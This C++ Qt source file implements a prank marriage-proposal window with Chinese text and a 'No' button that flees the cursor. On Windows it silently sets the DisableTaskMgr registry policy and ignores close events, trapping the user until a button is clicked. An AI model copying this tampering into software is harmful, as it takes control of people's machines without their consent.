#pragma execution_character_set("utf-8")
#include "loveLetter.hh"
#include <QIcon>
#include <QPixmap>
#include <QApplication>
#include <QAbstractAnimation>
#include <QTimer>
#include <QScreen>
#include <QSettings>
#include <iostream>
#include <random>
#include <exception>

void setTaskManagerVisable(bool flag) {
#define TASKMANAGER "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
  std::unique_ptr<QSettings> settings(new QSettings(TASKMANAGER, QSettings::NativeFormat));
  if (flag) settings->remove("DisableTaskMgr");
  else settings->setValue("DisableTaskMgr", "1");
}

enum { textLineHeight = 25, windowWidth = 350, windowHeight = 460, btnWidth = 75, btnHeight = 50, pending = 5, loveHeight = 300, loveWidth = 300, animeDuration = 3000 };
loveLetter::loveLetter(QWidget* parent)
  : QWidget(parent) {
#ifdef Q_OS_WIN
  setTaskManagerVisable(false);
#endif

#ifdef Q_OS_LINUX

#endif

#ifdef Q_OS_MAC

#endif
  setWindowIcon(QIcon(":/pic/love"));
  setWindowFlags(windowFlags() | Qt::FramelessWindowHint | Qt::WindowStaysOnTopHint);
  setFixedSize(windowWidth, windowHeight);
  auto scrGeo = QGuiApplication::primaryScreen()->availableGeometry();
  auto cx = (scrGeo.x() + scrGeo.width()) / 2, cy = (scrGeo.y() + scrGeo.height()) / 2;
  setGeometry(cx - windowWidth / 2, cy - windowHeight / 2, 0, 0);
  setMouseTracking(true);
  pLb.reset(new QLabel(this));
  pTo.reset(new QLabel(this));
  pFrom.reset(new QLabel(this));
  pTxt1.reset(new QLabel(this));
  pTxt2.reset(new QLabel(this));
  pTo->setFixedSize(windowWidth, textLineHeight);
  pFrom->setFixedSize(windowWidth, textLineHeight);
  pTxt1->setFixedSize(windowWidth, textLineHeight);
  pTxt2->setFixedSize(windowWidth, textLineHeight);
  pTo->setGeometry(pending, 0, 0, 0);
  pTxt1->setGeometry(pending, textLineHeight, 0, 0);
  pTxt2->setGeometry(pending, textLineHeight * 2 + loveHeight, 0, 0);
  pFrom->setGeometry(pending, textLineHeight * 3 + loveHeight, 0, 0);
  pTo->setText(tr("亲爱的小猫咪："));
  pTxt1->setText(tr("        我为你带来了许多好吃的小鱼干"));
  pTxt2->setText(tr("        那么，你愿意嫁给我吗？"));
  pFrom->setText(tr("你的大笨狗"));
  pLb->setFixedSize(loveWidth, loveHeight);
  pLoveGif.reset(new QMovie(":/pic/biu-love"));
  pLb->setMovie(pLoveGif.get());
  pLoveGif->start();
  pLb->setGeometry((windowWidth - loveWidth) / 2, textLineHeight * 2, 0, 0);
  for (int i = 0; i < 2; ++i) {
    pBtn[i].reset(new QToolButton(this));
    pBtn[i]->setFixedSize(btnWidth, btnHeight);
    pBtn[i]->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);
    pBtn[i]->setIcon(QIcon(QString(":/pic/btn") + QString(i + '0')));
  }
  pBtn[0]->setGeometry((windowWidth / 2 - btnWidth) / 2, windowHeight - btnHeight - pending, 0, 0);
  pBtn[0]->setText(tr("我愿意！"));
  pBtn[1]->setGeometry(3 * windowWidth / 4 - btnWidth / 2, windowHeight - btnHeight - pending, 0, 0);
  pBtn[1]->setText(tr("我不要～"));
  pBtn[1]->setFocusPolicy(Qt::FocusPolicy::NoFocus);
  // pBtn[1]->setDisabled(true);
  std::random_device rd;
  srand(rd());
  pAgree.reset(new agree);
  pAgree->setAutoFillBackground(false);
  pAgree->setAttribute(Qt::WA_TranslucentBackground, true);
  pAgree->hide();
  pAgEff.reset(new QGraphicsOpacityEffect(this->pAgree.get()));
  pAgEff->setOpacity(1);
  pAgree->setGraphicsEffect(pAgEff.get());
  pAgPA.reset(new QPropertyAnimation(pAgEff.get(), "opacity", this->pAgree.get()));
  pAgPA->setEasingCurve(QEasingCurve::InOutQuad);
  pAgPA->setDuration(animeDuration);
  pAgPA->setStartValue(0);
  pAgPA->setEndValue(1);
  pRefuse.reset(new refuse);
  pRefuse->setAutoFillBackground(false);
  pRefuse->setAttribute(Qt::WA_TranslucentBackground, true);
  pRefuse->hide();
  pRfEff.reset(new QGraphicsOpacityEffect(this->pRefuse.get()));
  pRfEff->setOpacity(1);
  pRefuse->setGraphicsEffect(pRfEff.get());
  pRfPA.reset(new QPropertyAnimation(pRfEff.get(), "opacity", this->pRefuse.get()));
  pRfPA->setEasingCurve(QEasingCurve::InOutQuad);
  pRfPA->setDuration(animeDuration);
  pRfPA->setStartValue(0);
  pRfPA->setEndValue(1);
  connect(pBtn[0].get(), &QToolButton::clicked, this, [&]() {
    this->hide();
    this->pAgree->show();
    this->pAgPA->start(QAbstractAnimation::KeepWhenStopped);
    QTimer::singleShot(animeDuration * 3, [&]() {
      this->pAgPA->setDirection(QAbstractAnimation::Backward);
      this->pAgPA->start(QAbstractAnimation::KeepWhenStopped);
      QTimer::singleShot(animeDuration, [&]() { setTaskManagerVisable(true); exit(0); });
      });
    });
  connect(pBtn[1].get(), &QToolButton::clicked, this, [&]() {
    this->hide();
    this->pRefuse->show();
    this->pRfPA->start(QAbstractAnimation::KeepWhenStopped);
    QTimer::singleShot(animeDuration * 3, [&]() {
      this->pRfPA->setDirection(QAbstractAnimation::Backward);
      this->pRfPA->start(QAbstractAnimation::KeepWhenStopped);
      QTimer::singleShot(animeDuration, [&]() { setTaskManagerVisable(true); exit(0); });
      });
    });
#define refuseBoxx1 (pBtn[1]->geometry().x() - pending)
#define refuseBoxx2 (pBtn[1]->geometry().x() + btnWidth + pending)
#define refuseBoxy1 (pBtn[1]->geometry().y() - pending)
#define refuseBoxy2 (pBtn[1]->geometry().y() + btnHeight + pending)
}

loveLetter::~loveLetter() {
#ifdef Q_OS_WIN
  setTaskManagerVisable(true);
#endif

#ifdef Q_OS_LINUX
  // std::cout << "Terminated" << std::endl;
#endif

#ifdef Q_OS_MAC

#endif
}

void loveLetter::closeEvent(QCloseEvent* event) {
  event->ignore();
}
int loveLetter::whichEdge(int x, int y) {
  if (x < refuseBoxx1 || x > refuseBoxx2 || y < refuseBoxy1 || y > refuseBoxy2) goto NONE;
  if (x <= refuseBoxx1 + pending && y <= refuseBoxy1 + pending) return 0;
  if (x > refuseBoxx1 + pending && x < refuseBoxx2 - pending && y <= refuseBoxy1 + pending) return 1;
  if (x >= refuseBoxx2 - pending && y <= refuseBoxy1 + pending) return 2;
  if (x >= refuseBoxx2 - pending && y > refuseBoxy1 + pending && y < refuseBoxy2 - pending) return 3;
  if (x >= refuseBoxx2 - pending && y >= refuseBoxy2 - pending) return 4;
  if (x > refuseBoxx1 + pending && x < refuseBoxx2 - pending && y >= refuseBoxy2 - pending) return 5;
  if (y >= refuseBoxy2 - pending && x <= refuseBoxx1 + pending) return 6;
  if (y > refuseBoxy1 + pending && x <= refuseBoxx1 + pending && y < refuseBoxy2 - pending) return 7;
NONE:
  return -1;
}
void loveLetter::mouseMoveEvent(QMouseEvent* event) {
  auto px = event->pos().x();
  auto py = event->pos().y();
  // static uint64_t i = 0;
  // std::cout << "Message" << i++ << std::endl;
  auto scrGeo = QGuiApplication::primaryScreen()->availableGeometry();
#define sx (scrGeo.x())
#define sy (scrGeo.y())
#define sw (scrGeo.width())
#define sh (scrGeo.height())
#define adjust (pending * (rand() % 20 + 30))
#define wx (geometry().x())
#define wy (geometry().y())
#define ww (geometry().width())
#define wh (geometry().height())
  auto x = wx, y = wy;
  switch (whichEdge(px, py)) {
  case 0: {
    x += adjust, y += adjust;
    break;
  }
  case 1: {
    y += adjust;
    break;
  }
  case 2: {
    x -= adjust, y += adjust;
    break;
  }
  case 3: {
    x -= adjust;
    break;
  }
  case 4: {
    x -= adjust, y -= adjust;
    break;
  }
  case 5: {
    y -= adjust;
    break;
  }
  case 6: {
    x += adjust, y -= adjust;
    break;
  }
  case 7: {
    x += adjust;
    break;
  }
  default: break;
  }
  using std::min;
  using std::max;
  x = max(x, sx);
  x = min(x, sx + sw);
  y = max(y, sy);
  y = min(y, sy + sh);
  if (x <= sx + pending) x = sx + sw - ww - adjust / 10;
  else if (x + ww >= sx + sw - pending) x = sx + adjust / 10;
  if (y <= sy + pending) y = sy + sh - wh - adjust / 10;
  else if (y + wh >= sy + sh - pending) y = sy + adjust / 10;
  x = max(x, sx);
  x = min(x, sx + sw);
  y = max(y, sy);
  y = min(y, sy + sh);
  setGeometry(x, y, 0, 0);
}
